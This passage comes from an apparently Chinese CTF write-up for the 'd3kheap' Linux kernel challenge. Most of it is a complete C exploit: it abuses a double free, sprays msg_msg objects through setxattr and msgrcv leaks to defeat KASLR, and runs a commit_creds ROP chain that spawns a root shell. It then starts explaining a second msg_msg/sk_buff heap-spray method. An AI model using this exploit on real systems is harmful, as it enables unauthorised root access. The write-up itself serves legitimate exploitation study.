MSG_COPY        040000  <span class="hljs-comment">/* copy (not remove) all queue messages */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_ADD     0x1234</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_EDIT    0x4321</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_SHOW 0xbeef</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_DEL     0xdead</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82c6d580</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_STARTUP_64 0xffffffff81000040</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_rflags;<br><span class="hljs-type">size_t</span> kernel_offset, kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;<br><br><span class="hljs-type">long</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], pipe_fd2[<span class="hljs-number">2</span>], pipe_fd_1;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">kernelLeakQuery</span><span class="hljs-params">(<span class="hljs-type">size_t</span> kernel_text_leak)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0xdeadbeef</span>;<br>    <span class="hljs-keyword">switch</span> (kernel_text_leak &amp; <span class="hljs-number">0xfff</span>)<br>    &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x6e9</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff812b76e9</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x980</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82101980</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x440</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82e77440</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xde7</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82411de7</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x4f0</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff817894f0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xc90</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff833fac90</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x785</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff823c3785</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x990</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff810b2990</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x900</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82e49900</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x8b4</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff8111b8b4</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xc40</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff8204ac40</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x320</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff8155c320</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xee0</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff810d6ee0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x5e0</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff810e55e0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xe80</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82f05e80</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x260</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82ec0260</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] fill up your dict!&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((kernel_offset % <span class="hljs-number">0x100000</span>) != <span class="hljs-number">0</span>) <span class="hljs-comment">// miss hit?</span><br>        kernel_offset = <span class="hljs-number">0xdeadbeef</span>;<br>    <span class="hljs-keyword">return</span> kernel_offset;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ioctl(dev_fd, OBJ_ADD);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ioctl(dev_fd, OBJ_DEL);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;cat /flag;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>        <span class="hljs-type">long</span> mtype;<br>        <span class="hljs-type">char</span> mtext[<span class="hljs-number">1</span>];<br>&#125;msg;<br> <br> <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prev</span>;</span><br>&#125;;<br> <br><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">long</span> m_type;<br>    <span class="hljs-type">size_t</span> m_ts;        <span class="hljs-comment">/* message text size */</span><br>    <span class="hljs-type">void</span> *next;         <span class="hljs-comment">/* struct msg_msgseg *next; */</span><br>    <span class="hljs-type">void</span> *security;     <span class="hljs-comment">/* NULL without SELinux */</span><br>    <span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> *buf;<br>    <span class="hljs-type">size_t</span> kernel_heap_leak = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> kernel_heap_search = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> kernel_text_leak = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> page_offset_base_guess = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> msg_offset, msg_offset_count;<br>    <span class="hljs-type">size_t</span> fake_ops_addr, fake_ops_offset, kmsg_addr;<br>    <span class="hljs-type">int</span> kmsg_idx;<br>    <span class="hljs-type">int</span> ms_qid[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">int</span> rop_idx;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    saveStatus();<br><br>    buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4000</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x4000</span>);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);<br><br>    add();<br><br>    del();<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>    &#123;<br>        ms_qid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>        <span class="hljs-keyword">if</span> (ms_qid[i] &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgget!&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-number">0X1000</span> - <span class="hljs-number">8</span>);<br>        ret = msgsnd(ms_qid[i], buf, <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgsnd!&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    del();<br><br>    <span class="hljs-comment">// leak msg_queue addr from heap</span><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-number">0x1000</span> - <span class="hljs-number">8</span>);<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>    setxattr(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);<br><br>    ret = msgrcv(ms_qid[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>) / <span class="hljs-number">8</span>); i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);<br>        <span class="hljs-keyword">if</span> (((buf[i] &amp; <span class="hljs-number">0xffff000000000000</span>) == <span class="hljs-number">0xffff000000000000</span>) &amp;&amp; !kernel_heap_leak &amp;&amp; (buf[i + <span class="hljs-number">3</span>] == (<span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>)))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] We got heap leak! kheap: %p\n&quot;</span>, buf[i]);<br>            kernel_heap_leak = buf[i];<br>            kmsg_idx = (<span class="hljs-type">int</span>)(((<span class="hljs-type">char</span>*)(&amp;buf[i + <span class="hljs-number">2</span>]))[<span class="hljs-number">0</span>] - <span class="hljs-string">&#x27;A&#x27;</span>);<br>            fake_ops_offset = i * <span class="hljs-number">8</span> + <span class="hljs-number">0x30</span> - <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (((buf[i] &amp; <span class="hljs-number">0xffffffff00000000</span>) == <span class="hljs-number">0xffffffff00000000</span>) &amp;&amp; !kernel_text_leak)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);<br>            kernel_offset = kernelLeakQuery(buf[i]);<br>            <span class="hljs-keyword">if</span> (kernel_offset != <span class="hljs-number">0xdeadbeef</span>)<br>            &#123;<br>                kernel_text_leak = buf[i];<br>                kernel_base += kernel_offset;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (kernel_text_leak &amp;&amp; kernel_heap_leak)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!kernel_heap_leak)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed to leak kernel heap!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// leak msg_msg addr</span><br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_leak - <span class="hljs-number">8</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>    setxattr(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">0x2e0</span>, <span class="hljs-number">0</span>);<br><br>    ret = msgrcv(ms_qid[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    kmsg_addr = buf[(<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>) / <span class="hljs-number">8</span> + <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">/*puts(&quot;[*] leaking...&quot;);</span><br><span class="hljs-comment">    for (int i = (0x1000 - 0x30) / 8; i &lt; (0x2000 - 0x30) / 8 ; i++)</span><br><span class="hljs-comment">        printf(&quot;[----data dump----] %d: %p\n&quot;, i, buf[i]);*/</span><br>    fake_ops_addr = kmsg_addr - fake_ops_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] UAF as fake ops addr at: %p, cal by msg idx: %d at addr: %p\n&quot;</span>, fake_ops_addr, kmsg_idx, kmsg_addr);<br><br>    <span class="hljs-comment">// leak kernel text base if we didn&#x27;t leak it before</span><br>    kernel_heap_search = kmsg_addr - <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> leaking_times = <span class="hljs-number">0</span>; !kernel_text_leak; leaking_times++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] per leaking, no.%d time(s)\n&quot;</span>, leaking_times);<br>    <br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="hljs-literal">NULL</span>;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="hljs-literal">NULL</span>;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="hljs-literal">NULL</span>;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_search;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>        setxattr(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">0x2e0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Now searching: %p\n&quot;</span>, kernel_heap_search);<br><br>        ret = msgrcv(ms_qid[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>            kernel_heap_search += <span class="hljs-number">0x1000</span> - <span class="hljs-number">8</span>;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        msg_offset_count = <span class="hljs-number">0</span>;<br>        msg_offset = <span class="hljs-number">0xdeadbeefbad4f00d</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>) / <span class="hljs-number">8</span>; i &lt; (<span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>) / <span class="hljs-number">8</span>; i++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);<br>            <span class="hljs-keyword">if</span> ((buf[i] &gt; <span class="hljs-number">0xffffffff81000000</span>) &amp;&amp; (buf[i] &lt; <span class="hljs-number">0xffffffffbfffffff</span>) &amp;&amp; !kernel_text_leak)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);<br>                kernel_offset = kernelLeakQuery(buf[i]);<br>                <span class="hljs-keyword">if</span> (kernel_offset != <span class="hljs-number">0xdeadbeef</span>)<br>                &#123;<br>                    kernel_text_leak = buf[i];<br>                    kernel_base += kernel_offset;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!buf[i])<br>                msg_offset = msg_offset_count * <span class="hljs-number">8</span>;<br>            msg_offset_count++;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (kernel_text_leak)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span> (msg_offset == <span class="hljs-number">0xdeadbeefbad4f00d</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Failed to find next valid foothold!&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        kernel_heap_search += msg_offset; <span class="hljs-comment">// to make the msg_msg-&gt;next == NULL, search from the last NULL</span><br>    &#125;<br><br>leak_out:<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-comment">// comfortably double free like A-&gt;B-&gt;A, its checking is as simple as the fastbin in ptmalloc2</span><br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = kernel_heap_search; <span class="hljs-comment">// a pointer to the heap is available, list_del (aka unlink) is easy to pass</span><br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = kernel_heap_search;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// while the kmem_cache-&gt;offset is not 0, we can easily repair the header of msg_msg</span><br>    setxattr(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">0x2e0</span>, <span class="hljs-number">0</span>);<br><br>    ret = msgrcv(ms_qid[kmsg_idx], buf, <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR); <span class="hljs-comment">// add a obj to pass detection in set_freepointer() in free_msg</span><br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    ret = msgrcv(ms_qid[<span class="hljs-number">0</span>], buf, <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR); <span class="hljs-comment">// constructing A-&gt;B-&gt;A</span><br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// regain UAF</span><br>    pipe(pipe_fd);<br>    pipe_fd_1 = pipe_fd[<span class="hljs-number">1</span>];<br><br>    pipe(pipe_fd2);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    buf[<span class="hljs-number">2</span>] = fake_ops_addr;<br>    buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0xffffffff812dbede</span> + kernel_offset; <span class="hljs-comment">// push rsi ; pop rsp ; pop 4 val ; ret</span><br><br>    <span class="hljs-comment">// construct ROP</span><br>    rop_idx = <span class="hljs-number">4</span>;<br>    buf[rop_idx++] = POP_RDI_RET + kernel_offset;<br>    buf[rop_idx++] = INIT_CRED + kernel_offset;<br>    buf[rop_idx++] = COMMIT_CREDS + kernel_offset;<br>    buf[rop_idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">0x16</span> + kernel_offset;<br>    buf[rop_idx++] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[rop_idx++] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[rop_idx++] = getRootShell;<br>    buf[rop_idx++] = user_cs;<br>    buf[rop_idx++] = user_rflags;<br>    buf[rop_idx++] = user_sp;<br>    buf[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake ops: %p, gadget: %p\n&quot;</span>, buf[<span class="hljs-number">2</span>], buf[<span class="hljs-number">1</span>]);<br>    setxattr(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">0x2e0</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//    sleep(5);</span><br><br>    <span class="hljs-comment">// trigger</span><br>    close(pipe_fd[<span class="hljs-number">0</span>]);<br>    close(pipe_fd[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[?] YOU FAILED? zen me hui shi ne?&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>不一定每次都能成功（由于开了 freelist 随机化的缘故，我们并不能保证进行 UAF 的 object 往高地址一定会有 msg_msg 结构体），但是经笔者实测成功率还是不低的</p><p><img src="https://s2.loli.net/2022/02/25/SXBzMHaNqKLmPTG.png" alt="image.png"></p><h2 id="解法二：msg-msg-sk-buff-堆喷">解法二：msg_msg + sk_buff 堆喷</h2><h3 id="Step-I-堆喷-msg-msg-，建立主从消息队列">Step.I 堆喷 <code>msg_msg</code> ，建立主从消息队列</h3><p>既然我们现在有了一个UAF的机会，那么选用什么样的结构体作为 victim 呢？这里我们选择使用 <code>msg_msg</code> 这一结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们在一个消息队列上发送多个消息时，会形成如下结构：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难想到的是，我们可以在一开始时先通过 d3kheap 设备提供的功能先获取一个 object 后释放，之后堆喷多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为 96，第二条消息（辅助消息）的大小为 0x400：</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>此时<strong>我们的辅助消息便有极大的概率获取到之前释放的 object</strong></p><blockquote><p>利用 <code>MSG_COPY</code> 标志位可以读取消息队列上的消息而不释放，参见<a 